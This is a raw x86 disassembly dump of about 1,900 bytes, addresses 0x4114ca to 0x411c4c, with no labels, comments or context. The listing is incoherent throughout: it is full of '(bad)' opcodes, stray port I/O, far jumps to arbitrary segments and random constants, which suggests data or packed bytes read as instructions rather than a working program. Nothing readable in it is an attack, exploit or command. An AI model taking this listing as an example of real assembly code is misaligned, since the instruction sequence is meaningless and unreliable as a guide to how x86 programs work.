  4114ca:	stc    
  4114cb:	lds    edi,FWORD PTR [eax-0x7e]
  4114ce:	leave  
  4114cf:	dec    ebp
  4114d0:	ja     0x4114ae
  4114d2:	mov    ch,0xc1
  4114d4:	cwde   
  4114d5:	out    dx,al
  4114d6:	dec    edi
  4114d7:	sti    
  4114d8:	mov    dl,0x4a
  4114da:	stc    
  4114db:	add    eax,DWORD PTR [edi+0x7a]
  4114de:	jmp    0xf6a1:0x114c8c6d
  4114e5:	xchg   edx,eax
  4114e6:	mov    ebx,0x324d496
  4114eb:	jb     0x41152a
  4114ed:	inc    ecx
  4114ee:	adc    BYTE PTR [esi+0xbb9b15],dh
  4114f4:	push   edi
  4114f5:	and    DWORD PTR [ecx-0x75],0xffffff81
  4114f9:	mov    cs,WORD PTR [ebp-0x35]
  4114fc:	arpl   WORD PTR [eax],si
  4114fe:	xchg   edx,eax
  4114ff:	mov    edi,DWORD PTR [edi]
  411501:	pop    ss
  411502:	add    dh,BYTE PTR [edi+ecx*8-0x1a5c68bf]
  411509:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41150a:	in     eax,dx
  41150b:	sar    BYTE PTR [ecx],cl
  41150d:	repz adc DWORD PTR [edx-0x304d7e8a],edi
  411514:	add    BYTE PTR [ebp+0x19],0x41
  411518:	sub    al,0x2d
  41151a:	pop    ss
  41151b:	aaa    
  41151c:	push   edi
  41151d:	jnp    0x4114ed
  41151f:	ja     0x411538
  411521:	xchg   ebx,eax
  411522:	ret    
  411523:	(bad)  [edx+0x3f]
  411526:	push   ebp
  411527:	mov    ch,0xe9
  411529:	retf   
  41152a:	(bad)  
  41152b:	dec    esp
  41152c:	mov    ebx,0x2f070b8b
  411531:	aam    0x7
  411533:	or     BYTE PTR [ebp-0x31],dl
  411536:	inc    ebp
  411537:	inc    esp
  411538:	mov    dl,0xe9
  41153a:	or     BYTE PTR [edi],cl
  41153c:	jmp    0x3f02:0x5232c451
  411543:	ret    
  411544:	outs   dx,DWORD PTR ds:[esi]
  411545:	sar    BYTE PTR [edx+0x1c],cl
  411548:	or     al,0xec
  41154a:	mov    esp,eax
  41154c:	cmp    eax,0x3379aa7f
  411551:	xchg   ebx,eax
  411552:	dec    ebx
  411553:	scas   al,BYTE PTR es:[edi]
  411554:	nop
  411555:	jl     0x411598
  411557:	(bad)  
  411558:	jge    0x4115d0
  41155a:	and    eax,0xe85312e4
  41155f:	icebp  
  411560:	popf   
  411561:	mov    WORD PTR [edx-0x429dec91],fs
  411567:	ins    DWORD PTR es:[edi],dx
  411568:	fsubr  DWORD PTR [ebp-0x42ea44fe]
  41156e:	xor    al,BYTE PTR [esi-0x35916dad]
  411574:	imul   ebx,ecx,0xfffffff0
  411577:	retf   
  411578:	nop
  411579:	mov    dl,0xc5
  41157b:	dec    esp
  41157c:	ficomp DWORD PTR [esi]
  41157e:	xlat   BYTE PTR ds:[ebx]
  41157f:	jmp    0xf7e3:0xe163d350
  411586:	pop    ebp
  411587:	sub    BYTE PTR [eax],ah
  411589:	data16 (bad) 
  41158b:	jo     0x411596
  41158d:	bswap  esp
  41158f:	jb     0x4115e8
  411591:	out    dx,al
  411592:	outs   dx,DWORD PTR ds:[esi]
  411593:	iret   
  411594:	jo     0x4115f1
  411596:	scas   eax,DWORD PTR es:[edi]
  411597:	add    DWORD PTR [esi],ebp
  411599:	push   ss
  41159a:	pop    eax
  41159b:	imul   ch
  41159d:	in     eax,dx
  41159e:	mov    ebp,0x6123356f
  4115a3:	ret    0x7df6
  4115a6:	ror    DWORD PTR [ebp+0xa357b7],1
  4115ac:	cmp    eax,0xcdbcd9fb
  4115b1:	cmp    al,0xcf
  4115b3:	(bad)  
  4115b4:	jecxz  0x4115bf
  4115b6:	pop    eax
  4115b7:	es pop esi
  4115b9:	jae    0x41163a
  4115bb:	imul   ebp,DWORD PTR [ecx+0x36],0xffffffa7
  4115bf:	xchg   edx,eax
  4115c0:	mov    bl,0x10
  4115c2:	gs push ebp
  4115c4:	ficomp WORD PTR [ebx-0x31a47bb3]
  4115ca:	inc    ebx
  4115cb:	push   ebp
  4115cc:	bound  esp,QWORD PTR [eax-0x1d384828]
  4115d2:	jno    0x411577
  4115d4:	call   FWORD PTR [eax]
  4115d6:	lods   eax,DWORD PTR ds:[esi]
  4115d7:	lods   eax,DWORD PTR ds:[esi]
  4115d8:	sti    
  4115d9:	mov    bh,0xf1
  4115db:	cmp    ah,ah
  4115dd:	fbstp  TBYTE PTR [eiz*8+0x5ad8b70f]
  4115e4:	icebp  
  4115e5:	mov    edi,edi
  4115e7:	cld    
  4115e8:	jo     0x411615
  4115ea:	ret    0x9777
  4115ed:	dec    edi
  4115ee:	jp     0x4115db
  4115f0:	aaa    
  4115f1:	aam    0x61
  4115f3:	add    eax,0x5d83fc09
  4115f8:	and    al,0x45
  4115fa:	loop   0x4115ed
  4115fc:	div    BYTE PTR [eax-0x2c5db594]
  411602:	lds    esp,FWORD PTR [ebx-0x55]
  411605:	ret    0xe2ff
  411608:	lock or al,0xe0
  41160b:	fstp   DWORD PTR [edx+0x40]
  41160e:	in     al,0x7e
  411610:	cmp    DWORD PTR [ecx+0x5be8d50e],ecx
  411616:	lds    ecx,FWORD PTR [eax-0x7]
  411619:	jne    0x41161f
  41161b:	mov    esp,0x20365414
  411620:	xor    al,0x7b
  411622:	int    0x5c
  411624:	add    bl,cl
  411626:	add    DWORD PTR [esp+edi*8-0x3d2fba64],esi
  41162d:	dec    ecx
  41162e:	sbb    eax,0x70aa6740
  411633:	dec    ebp
  411634:	imul   ebp,edi,0xaa26d877
  41163a:	addr16 xor eax,0x45e780a2
  411640:	retf   
  411641:	xlat   BYTE PTR ds:[ebx]
  411642:	rcl    BYTE PTR [ebx-0x7bea717e],1
  411648:	inc    esp
  411649:	mov    al,0xdb
  41164b:	fs push edi
  41164d:	out    0x84,eax
  41164f:	(bad)  
  411650:	cmp    esp,ebx
  411652:	dec    esp
  411653:	xor    BYTE PTR [eax+0xe],bl
  411656:	(bad)  
  411657:	sub    DWORD PTR [ecx],ebp
  411659:	adc    edi,DWORD PTR [ebx]
  41165b:	inc    esi
  41165c:	loope  0x4115e1
  41165e:	in     al,0xa9
  411660:	sbb    dh,BYTE PTR [ecx-0x7d47d5d3]
  411666:	(bad)  [ebp-0x49c7d635]
  41166c:	sub    al,0x8d
  41166e:	push   esi
  41166f:	sub    DWORD PTR [ebx+0x464814da],ecx
  411675:	ldmxcsr DWORD PTR [ebp-0x5254fc9a]
  41167c:	add    eax,0xa033d2ba
  411681:	les    edi,FWORD PTR [ecx+eax*2]
  411684:	int    0x7d
  411686:	jno    0x411685
  411688:	dec    ebx
  411689:	(bad)  
  41168a:	out    0x61,eax
  41168c:	outs   dx,BYTE PTR ds:[esi]
  41168d:	add    dl,BYTE PTR [edx]
  41168f:	(bad)  
  411690:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  411692:	jmp    0x6454:0xf57b5330
  411699:	cmp    ch,dl
  41169b:	arpl   bp,di
  41169d:	imul   DWORD PTR [edi+0x723ae5f3]
  4116a3:	call   0x7168:0x3f4fe212
  4116aa:	cli    
  4116ab:	mov    esi,0x3ad88c89
  4116b0:	xor    ecx,esp
  4116b2:	jle    0x41170f
  4116b4:	rcr    edx,0xb6
  4116b7:	push   ds
  4116b8:	fs mov cx,0x7009
  4116bd:	shr    BYTE PTR [ebx],cl
  4116bf:	jge    0x4116ed
  4116c1:	outs   dx,DWORD PTR ds:[esi]
  4116c2:	push   0xc4659212
  4116c7:	jl     0x411705
  4116c9:	popa   
  4116ca:	jb     0x41167d
  4116cc:	pushf  
  4116cd:	mov    eax,0x9ed3274
  4116d2:	jb     0x4116ba
  4116d4:	ss push edi
  4116d6:	fldln2 
  4116d8:	jne    0x41174e
  4116da:	mov    ecx,0x6a312727
  4116df:	outs   dx,BYTE PTR ds:[esi]
  4116e0:	pop    ebp
  4116e1:	dec    ebp
  4116e2:	adc    ah,BYTE PTR [ebp+0x4c663fbf]
  4116e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116e9:	xchg   edi,eax
  4116ea:	jl     0x41166d
  4116ec:	jne    0x41166e
  4116ee:	ret    
  4116ef:	sti    
  4116f0:	jmp    0x41173e
  4116f2:	pop    ebp
  4116f3:	pop    ss
  4116f4:	xchg   ch,bl
  4116f6:	stos   DWORD PTR es:[edi],eax
  4116f7:	call   0x2286:0xff422976
  4116fe:	lock sub eax,0xeb162167
  411704:	push   esp
  411705:	(bad)  
  411706:	adc    ah,ah
  411708:	dec    edx
  411709:	adc    al,0x64
  41170b:	inc    esi
  41170c:	mov    cl,0x8b
  41170e:	fwait
  41170f:	mov    WORD PTR [ecx],gs
  411711:	pop    ecx
  411712:	rol    BYTE PTR [edx+0x2b],cl
  411715:	hlt    
  411716:	inc    esp
  411717:	push   esi
  411718:	add    edi,esp
  41171a:	outs   dx,DWORD PTR ds:[esi]
  41171b:	pop    esi
  41171c:	push   ds
  41171d:	xchg   ecx,eax
  41171e:	fadd   QWORD PTR [edx]
  411720:	jo     0x41173f
  411722:	push   eax
  411723:	imul   ecx,DWORD PTR [edi+edx*4],0x4d8dc964
  41172a:	out    0xb7,al
  41172c:	out    dx,eax
  41172d:	repz mov cl,0xb6
  411730:	and    ch,BYTE PTR [edx+edx*1]
  411733:	imul   esi,DWORD PTR [edi+0x1e],0x41876686
  41173a:	scas   al,BYTE PTR es:[edi]
  41173b:	sbb    BYTE PTR ds:0xceac2648,bl
  411741:	ror    DWORD PTR [edi-0x75621726],0x25
  411748:	add    bh,dh
  41174a:	or     BYTE PTR [ebp+0x3775d382],ch
  411750:	dec    eax
  411751:	push   ds
  411752:	lods   eax,DWORD PTR ds:[esi]
  411753:	mov    cl,0x99
  411755:	inc    eax
  411756:	mov    ch,0x3d
  411758:	ja     0x41175b
  41175a:	xor    ch,BYTE PTR [ecx]
  41175c:	pop    esi
  41175d:	mov    esp,0x8fd3985b
  411762:	dec    ebx
  411763:	mov    ds:0xc23bc2a0,eax
  411768:	sub    eax,0xe310f3a1
  41176d:	jl     0x41175c
  41176f:	div    BYTE PTR [ebx+0x22]
  411772:	les    esp,FWORD PTR [esi]
  411774:	mov    ecx,eax
  411776:	and    al,0xa8
  411778:	cmp    bh,BYTE PTR [ebp+eax*1-0x2f]
  41177c:	sub    eax,0xc55f0fd9
  411781:	xor    BYTE PTR [ebp-0x29b154f4],ch
  411787:	ret    
  411788:	(bad)  
  411789:	mov    bl,al
  41178b:	loop   0x4117b4
  41178d:	sub    edx,edx
  41178f:	lea    esi,[ecx]
  411791:	push   ds
  411792:	mov    esp,DWORD PTR [ecx]
  411794:	sar    eax,0xf
  411797:	pop    ebx
  411798:	(bad)  
  411799:	adc    DWORD PTR [ebx+0x4b],edi
  41179c:	loope  0x411737
  41179e:	call   0x941c:0xfceae59d
  4117a5:	push   ebx
  4117a6:	(bad)  
  4117a7:	mov    edx,0x83b6d2f2
  4117ac:	ss out 0xfe,eax
  4117af:	ss jnp 0x4117d7
  4117b2:	scas   al,BYTE PTR es:[edi]
  4117b3:	test   DWORD PTR ds:0xeaf31978,ebp
  4117b9:	stos   DWORD PTR es:[edi],eax
  4117ba:	jnp    0x411810
  4117bc:	dec    edx
  4117bd:	aas    
  4117be:	push   ebx
  4117bf:	adc    bl,ah
  4117c1:	mov    ebx,0xcf69151c
  4117c6:	xor    al,0x1
  4117c8:	outs   dx,DWORD PTR ds:[esi]
  4117c9:	xor    al,0xf5
  4117cb:	out    dx,eax
  4117cc:	inc    esi
  4117cd:	add    dl,ah
  4117cf:	cmp    BYTE PTR [eax],dh
  4117d1:	popa   
  4117d2:	dec    esi
  4117d3:	imul   eax,edx,0xffffffa0
  4117d6:	mov    bh,0xbd
  4117d8:	and    DWORD PTR [eax+0x76898c75],0x92d499f4
  4117e2:	inc    eax
  4117e3:	push   esi
  4117e5:	and    DWORD PTR [esi],edx
  4117e7:	ror    DWORD PTR [ebp+0x7822fba5],1
  4117ed:	mov    ah,0x69
  4117ef:	pusha  
  4117f0:	adc    al,0x44
  4117f2:	addr16 mov ebp,0xb09da2ef
  4117f8:	mov    ebp,0x4b9e4db3
  4117fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117fe:	test   eax,0x84ec502
  411803:	sbb    eax,0x1b3f6f0a
  411808:	aas    
  411809:	xor    al,0x91
  41180b:	and    dh,0x5e
  41180e:	mov    edi,0x6c6775dc
  411813:	mov    eax,0xeea7a86
  411818:	sbb    bl,BYTE PTR [ecx-0x54]
  41181b:	or     ah,BYTE PTR [edx+ecx*4-0x2f]
  41181f:	mov    al,ds:0x9c9f2141
  411824:	aam    0xd2
  411826:	jnp    0x4117ad
  411828:	scas   eax,DWORD PTR es:[edi]
  411829:	jmp    0x41186c
  41182b:	inc    esi
  41182c:	add    DWORD PTR [edi],0x7afefdee
  411832:	add    BYTE PTR [ebx*8+0x3e70e66f],ah
  411839:	mov    ebp,0x15ff3eb0
  41183e:	gs mov edx,0x74f4c1c1
  411844:	jns    0x411814
  411846:	pop    ebx
  411847:	inc    esi
  411848:	dec    ebp
  411849:	sbb    ch,0xfe
  41184c:	pop    ds
  41184d:	xchg   esi,eax
  41184e:	ins    BYTE PTR es:[edi],dx
  41184f:	push   esi
  411850:	fisubr WORD PTR [ebx-0x7]
  411853:	pop    eax
  411854:	fstp   DWORD PTR [ebp+0x4f]
  411857:	iret   
  411858:	adc    BYTE PTR ds:0x31cdd0bf,cl
  41185e:	xchg   ebx,eax
  41185f:	and    BYTE PTR [ecx],bh
  411861:	mov    al,0x69
  411863:	ss xchg edi,eax
  411865:	lahf   
  411866:	test   DWORD PTR [ebp+0x13],esi
  411869:	mov    ch,0x37
  41186b:	(bad)  
  41186c:	js     0x411892
  41186e:	mov    esp,0x947e167c
  411873:	or     BYTE PTR [esi],cl
  411875:	out    dx,eax
  411876:	retf   0x528
  411879:	call   0xfda6b92a
  41187e:	or     al,0x91
  411880:	inc    esp
  411881:	cmp    al,0x22
  411883:	push   es
  411884:	jmp    0x3e83e80
  411889:	(bad)  
  41188a:	push   edx
  41188b:	jg     0x41189f
  41188d:	mov    edx,0xd8dc0b5c
  411892:	leave  
  411893:	xchg   esi,eax
  411894:	mov    esp,0x8ee60667
  411899:	pop    ss
  41189a:	sbb    al,0x6a
  41189c:	rcr    bl,cl
  41189e:	bound  ebx,QWORD PTR [edi*4-0x20c7acd7]
  4118a5:	das    
  4118a6:	aam    0x13
  4118a8:	or     al,0x14
  4118aa:	ins    DWORD PTR es:[edi],dx
  4118ab:	ret    0xf521
  4118ae:	xor    ebp,ebp
  4118b0:	lock and al,0x55
  4118b3:	std    
  4118b4:	add    eax,0x6fd6f2e4
  4118b9:	xchg   ecx,eax
  4118ba:	jno    0x411886
  4118bc:	jae    0x4118f1
  4118be:	add    eax,0x761e8acd
  4118c3:	jns    0x411851
  4118c5:	jnp    0x4118a5
  4118c7:	xor    DWORD PTR [edx+eiz*4],ebx
  4118ca:	sub    esi,DWORD PTR [edx]
  4118cc:	pop    esp
  4118cd:	sahf   
  4118ce:	mov    ds:0xa9100b48,eax
  4118d3:	push   eax
  4118d4:	dec    edx
  4118d5:	cdq    
  4118d6:	inc    ebp
  4118d7:	add    BYTE PTR [ecx-0x3],dl
  4118da:	outs   dx,BYTE PTR ds:[esi]
  4118db:	lds    esp,FWORD PTR [edi]
  4118dd:	mov    esi,0x82429ec9
  4118e2:	cmp    eax,0x3b4f1b50
  4118e7:	xchg   ebp,eax
  4118e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118e9:	or     eax,0x274e0f4
  4118ee:	cmp    ebp,edx
  4118f0:	ret    0x3134
  4118f3:	sbb    al,0x82
  4118f5:	dec    ecx
  4118f6:	and    al,bl
  4118f8:	sbb    ecx,DWORD PTR [esi-0x35a54d2c]
  4118fe:	in     al,dx
  4118ff:	outs   dx,BYTE PTR ds:[esi]
  411900:	(bad)  
  411901:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411902:	dec    DWORD PTR [edi-0x3ffe70c7]
  411908:	(bad)  
  411909:	and    eax,0xf3b4d7d7
  41190e:	jle    0x411939
  411910:	add    DWORD PTR cs:[esi+0xa],ecx
  411914:	div    DWORD PTR [ebx+0x4ed76982]
  41191a:	push   ss
  41191b:	push   esp
  41191c:	stos   DWORD PTR es:[edi],eax
  41191d:	add    al,0x6b
  41191f:	out    0x60,eax
  411921:	daa    
  411922:	add    DWORD PTR [esi-0x5f1d0ed0],ebx
  411928:	pop    ds
  411929:	jbe    0x41195b
  41192b:	adc    edi,esi
  41192d:	fcmovu st,st(7)
  41192f:	ins    BYTE PTR es:[edi],dx
  411930:	sbb    ch,BYTE PTR [ecx+eiz*4]
  411933:	enter  0x9415,0xdc
  411937:	daa    
  411938:	mov    ds:0x2752a092,eax
  41193d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41193e:	mov    dl,0x1
  411940:	sub    cl,BYTE PTR [ebp+0x6cc3fc2a]
  411946:	pushf  
  411947:	add    al,al
  411949:	dec    edx
  41194a:	fs call 0x391b:0x9e9c451d
  411952:	mov    ebp,0xd40843e
  411957:	or     eax,0x72d68ebc
  41195c:	cmc    
  41195d:	push   cs
  41195e:	(bad)  
  41195f:	cmp    eax,0x7e524cc5
  411964:	inc    edx
  411965:	add    eax,0xe28b1fab
  41196a:	cmp    eax,0x44fa6055
  41196f:	imul   ebx,DWORD PTR [eax-0x2f368a5a],0x60
  411976:	pop    ecx
  411977:	fild   WORD PTR [esp+edi*8+0x0]
  41197b:	and    BYTE PTR [ecx],bl
  41197d:	aam    0xa3
  41197f:	leave  
  411980:	sahf   
  411981:	mov    BYTE PTR [esi-0x727f1d4],bh
  411987:	data16 aad 0x7b
  41198a:	inc    ecx
  41198b:	pop    eax
  41198c:	sbb    BYTE PTR [ebp-0x414870c1],dh
  411992:	sbb    eax,0x34f3e15b
  411997:	jmp    0x41196c
  411999:	add    eax,0x5733edb5
  41199e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41199f:	pusha  
  4119a0:	jno    0x411998
  4119a2:	dec    esp
  4119a3:	sbb    esi,ebp
  4119a5:	dec    eax
  4119a6:	xor    eax,DWORD PTR [eax]
  4119a8:	call   0x483160d5
  4119ad:	mov    ds:0xf78f73d8,eax
  4119b2:	inc    esp
  4119b3:	push   0x59
  4119b5:	inc    esi
  4119b6:	push   eax
  4119b7:	fnstenv [ebx+0x5d527e1]
  4119bd:	cdq    
  4119be:	cli    
  4119bf:	mov    bl,0xfb
  4119c1:	mov    ds,WORD PTR [ebp-0x18]
  4119c4:	cmc    
  4119c5:	jge    0x411995
  4119c7:	push   ds
  4119c8:	push   eax
  4119c9:	jnp    0x411a0a
  4119cb:	outs   dx,BYTE PTR ds:[esi]
  4119cc:	in     al,dx
  4119cd:	stos   DWORD PTR es:[edi],eax
  4119ce:	daa    
  4119cf:	or     ecx,esp
  4119d1:	cmp    al,0xfe
  4119d3:	add    BYTE PTR [edi],bl
  4119d5:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119d7:	xchg   edi,eax
  4119d8:	pop    es
  4119d9:	dec    ebx
  4119da:	shl    BYTE PTR [eax+0x6f3bd696],1
  4119e0:	fwait
  4119e1:	lods   al,BYTE PTR ds:[esi]
  4119e2:	pop    ecx
  4119e3:	int3   
  4119e4:	fisub  WORD PTR [ebx]
  4119e6:	jle    0x411971
  4119e8:	scas   al,BYTE PTR es:[edi]
  4119e9:	sub    al,ah
  4119eb:	out    0x14,al
  4119ed:	ins    DWORD PTR es:[edi],dx
  4119ee:	fisttp DWORD PTR [edx-0x15]
  4119f1:	(bad)  
  4119f2:	mov    cs,WORD PTR [ecx]
  4119f4:	and    eax,edx
  4119f6:	cdq    
  4119f7:	sbb    BYTE PTR [eax],bh
  4119f9:	push   es
  4119fa:	es test al,0xd9
  4119fd:	inc    esp
  4119fe:	xor    eax,0x735020fc
  411a03:	dec    edx
  411a04:	std    
  411a05:	mov    eax,ds:0xb3a11a65
  411a0a:	and    al,0xf1
  411a0c:	mov    al,0xaf
  411a0e:	pop    ecx
  411a0f:	call   0x4fb2b16d
  411a14:	push   0x3f
  411a16:	xor    ch,BYTE PTR [ecx+0x532b0558]
  411a1c:	jns    0x411a88
  411a1e:	dec    eax
  411a1f:	sub    DWORD PTR [esi-0x222bacfb],eax
  411a25:	sub    al,0xee
  411a27:	xchg   esp,eax
  411a28:	aad    0x40
  411a2a:	(bad)  
  411a2b:	push   ss
  411a2c:	push   ebx
  411a2d:	std    
  411a2e:	dec    esp
  411a2f:	into   
  411a30:	test   al,0x4e
  411a32:	int3   
  411a33:	es jb  0x411a80
  411a36:	jmp    0x4119ce
  411a38:	cmp    DWORD PTR ss:[ebx+ebx*1+0x57],edx
  411a3d:	pop    eax
  411a3e:	gs dec ebx
  411a40:	push   ds
  411a41:	mov    ch,BYTE PTR [esi]
  411a43:	std    
  411a44:	xlat   BYTE PTR ds:[ebx]
  411a45:	aas    
  411a46:	es pop eax
  411a48:	adc    BYTE PTR [esi-0x54],ah
  411a4b:	pop    ebp
  411a4c:	jno    0x411a98
  411a4e:	add    dl,BYTE PTR [eax]
  411a50:	xchg   esp,eax
  411a51:	int3   
  411a52:	push   edx
  411a53:	xchg   edi,eax
  411a54:	out    dx,eax
  411a55:	mov    ds:0xf2723463,eax
  411a5a:	jecxz  0x411a51
  411a5c:	imul   eax,esp,0xec80553e
  411a62:	jecxz  0x411aa1
  411a64:	xchg   BYTE PTR [ebx+0x33],bh
  411a67:	adc    BYTE PTR [edx+edi*1+0x5e],ch
  411a6b:	inc    ecx
  411a6c:	inc    ebx
  411a6d:	dec    edi
  411a6e:	cmp    DWORD PTR [esi+ebx*8+0x4d],ebx
  411a72:	cmp    al,0xad
  411a74:	adc    eax,0x83332ee5
  411a79:	pop    es
  411a7a:	cmp    esp,DWORD PTR [edi]
  411a7c:	inc    ebx
  411a7d:	pop    eax
  411a7e:	add    ebx,esi
  411a80:	mov    bh,0x6b
  411a82:	xor    BYTE PTR [edx-0x420919a1],bh
  411a88:	xlat   BYTE PTR ds:[ebx]
  411a89:	inc    ecx
  411a8a:	pop    eax
  411a8b:	(bad)  
  411a8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a8d:	(bad)  
  411a8e:	cmp    ah,BYTE PTR [eax+0x3d]
  411a91:	inc    eax
  411a92:	push   edx
  411a93:	aad    0xd5
  411a95:	int3   
  411a96:	xchg   esi,eax
  411a97:	sub    bl,al
  411a99:	cmp    eax,0x619d0dd0
  411a9e:	loope  0x411aa2
  411aa0:	scas   eax,DWORD PTR es:[edi]
  411aa1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411aa2:	fbstp  TBYTE PTR [eax]
  411aa4:	adc    DWORD PTR [ebp-0x709b2212],ebp
  411aaa:	daa    
  411aab:	stos   BYTE PTR es:[edi],al
  411aac:	adc    esp,DWORD PTR [ebx+0x2e]
  411aaf:	and    edi,eax
  411ab1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ab2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ab3:	push   0xf9491677
  411ab8:	fldenv [edi]
  411aba:	mov    esp,?
  411abc:	xchg   esp,eax
  411abd:	into   
  411abe:	jmp    0x21951c47
  411ac3:	or     eax,0x6be96d74
  411ac8:	and    eax,0x87d41751
  411acd:	addr16 popa 
  411acf:	test   BYTE PTR [ebp+edx*4+0x92f5ae6],bl
  411ad6:	push   ecx
  411ad7:	xchg   esi,eax
  411ad8:	out    0x9e,al
  411ada:	pop    esp
  411adb:	shr    BYTE PTR [edx+0x31],1
  411ade:	out    dx,eax
  411adf:	mov    ecx,0xfb481f27
  411ae4:	adc    esp,DWORD PTR [edx+0x46]
  411ae7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ae8:	mov    dh,0xe6
  411aea:	repz and bl,ah
  411aed:	inc    ebp
  411aee:	rol    BYTE PTR [esi],1
  411af0:	scas   al,BYTE PTR es:[edi]
  411af1:	shl    al,cl
  411af3:	sahf   
  411af4:	inc    esp
  411af5:	fld    TBYTE PTR [edi]
  411af7:	xor    eax,0xc22136c3
  411afc:	jnp    0x411aaa
  411afe:	mov    edi,DWORD PTR [edx]
  411b00:	xchg   ebx,eax
  411b01:	dec    edi
  411b02:	ins    DWORD PTR es:[edi],dx
  411b03:	outs   dx,BYTE PTR ds:[esi]
  411b04:	cdq    
  411b05:	retf   0x9354
  411b08:	adc    DWORD PTR [ebp*2+0x436e0da1],esp
  411b0f:	ffreep st(0)
  411b11:	lock ins BYTE PTR es:[edi],dx
  411b13:	dec    esp
  411b14:	and    al,0xa6
  411b16:	mov    esp,0x4d3c9273
  411b1b:	inc    ebx
  411b1c:	icebp  
  411b1d:	sub    DWORD PTR [edx-0x7f],0x65
  411b21:	aas    
  411b22:	not    eax
  411b24:	ret    
  411b25:	imul   BYTE PTR [eax]
  411b27:	aaa    
  411b28:	cmp    eax,0x5be9c431
  411b2d:	pop    esi
  411b2e:	add    BYTE PTR [edx+0x4],ch
  411b31:	jae    0x411aed
  411b33:	out    dx,eax
  411b34:	pop    ss
  411b35:	test   DWORD PTR [edi-0x1d],ebx
  411b38:	leave  
  411b39:	and    BYTE PTR [ebx-0xa],ch
  411b3c:	xor    ebp,DWORD PTR [eax+0x776e023]
  411b42:	inc    di
  411b44:	ins    DWORD PTR es:[edi],dx
  411b45:	pop    esp
  411b46:	pushf  
  411b47:	out    dx,eax
  411b48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b49:	ret    0xe4f1
  411b4c:	inc    ecx
  411b4d:	dec    ebx
  411b4e:	push   eax
  411b4f:	retf   
  411b50:	fs xchg ecx,eax
  411b52:	cmc    
  411b53:	popa   
  411b54:	dec    ecx
  411b55:	or     DWORD PTR [edi+0x2fb18d57],eax
  411b5b:	cdq    
  411b5c:	in     al,0xab
  411b5e:	sub    al,0x1b
  411b60:	out    dx,al
  411b61:	ret    0x76c0
  411b64:	jp     0x411b74
  411b66:	aaa    
  411b67:	cmp    eax,0xe7e98645
  411b6c:	stos   BYTE PTR es:[edi],al
  411b6d:	xor    eax,DWORD PTR [ebx+esi*2+0x3f]
  411b71:	rol    esp,1
  411b73:	imul   ebp,DWORD PTR [eax-0x73],0x24f1f76e
  411b7a:	jecxz  0x411bd5
  411b7c:	dec    esp
  411b7d:	mov    eax,0xc60174b0
  411b82:	imul   esp,DWORD PTR es:[edi*1+0x3af79cf5],0xffffffa8
  411b8b:	dec    esp
  411b8c:	fistp  WORD PTR [esi+edi*8-0x16]
  411b90:	mov    edi,0x7a39149a
  411b95:	pop    esi
  411b96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b97:	push   ebx
  411b98:	repz inc eax
  411b9a:	push   edx
  411b9b:	mov    esi,0xa278c969
  411ba0:	dec    esi
  411ba1:	out    0xde,al
  411ba3:	push   es
  411ba4:	mov    ds:0x8aec3389,eax
  411ba9:	(bad)  [ecx]
  411bab:	mov    eax,ds:0x5f3efe25
  411bb0:	call   0xb3e5:0xb4e53bf0
  411bb7:	int3   
  411bb8:	sbb    ebp,DWORD PTR [edi+eiz*4-0x5cca7ff]
  411bbf:	mov    ebp,0xc748a2d5
  411bc4:	inc    esi
  411bc5:	xchg   edi,eax
  411bc6:	ins    BYTE PTR es:[edi],dx
  411bc7:	mov    ecx,0x2f8ec7a1
  411bcc:	ret    
  411bcd:	pop    ebx
  411bce:	popf   
  411bcf:	and    ah,BYTE PTR [eax-0x6f86b73a]
  411bd5:	adc    ebx,esp
  411bd7:	mov    WORD PTR fs:[edi+0x30],bx
  411bdc:	add    eax,0x8889592c
  411be2:	xchg   edi,eax
  411be3:	js     0x411b7b
  411be5:	or     al,0xc4
  411be7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411be8:	pop    ecx
  411be9:	imul   eax,ebp,0x6e
  411bec:	pop    ebx
  411bed:	xor    BYTE PTR [eax-0x71],al
  411bf0:	daa    
  411bf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411bf2:	jl     0x411c3d
  411bf4:	mov    al,0x6
  411bf6:	jle    0x411b9a
  411bf8:	mov    ds:0xc6fe774e,al
  411bfd:	sbb    eax,0x925c706b
  411c02:	cmc    
  411c03:	pop    ds
  411c04:	push   esp
  411c05:	push   esp
  411c06:	xchg   ebp,eax
  411c07:	pop    esp
  411c08:	stos   BYTE PTR es:[edi],al
  411c09:	adc    esi,DWORD PTR [edi-0x2b]
  411c0c:	mov    al,ds:0xbe8a95cd
  411c11:	in     al,0xfc
  411c13:	outs   dx,BYTE PTR ds:[esi]
  411c14:	sbb    bh,al
  411c16:	ins    DWORD PTR es:[edi],dx
  411c17:	jg     0x411c5c
  411c19:	jmp    0xc99345da
  411c1e:	shl    BYTE PTR [edx],1
  411c20:	fisub  DWORD PTR [esi+0x35]
  411c23:	retf   
  411c24:	addr16 jg 0x411baa
  411c27:	adc    BYTE PTR [ebx],0x62
  411c2a:	in     eax,0x1
  411c2c:	scas   al,BYTE PTR es:[edi]
  411c2d:	fcmovnb st,st(7)
  411c2f:	jne    0x411c63
  411c31:	pop    edx
  411c32:	inc    esi
  411c33:	dec    esi
  411c34:	cmp    edx,DWORD PTR [edx]
  411c36:	cmp    edx,DWORD PTR [edi+0x5c]
  411c39:	or     BYTE PTR [edi-0x38f8db35],cl
  411c3f:	nop
  411c40:	pop    ss
  411c41:	idiv   DWORD PTR [eax-0x20810668]
  411c47:	dec    ebp
  411c48:	call   ebx
  411c4a:	add    edi,DWORD PTR [ebx]
  411c4c:	sbb    al,0xb8
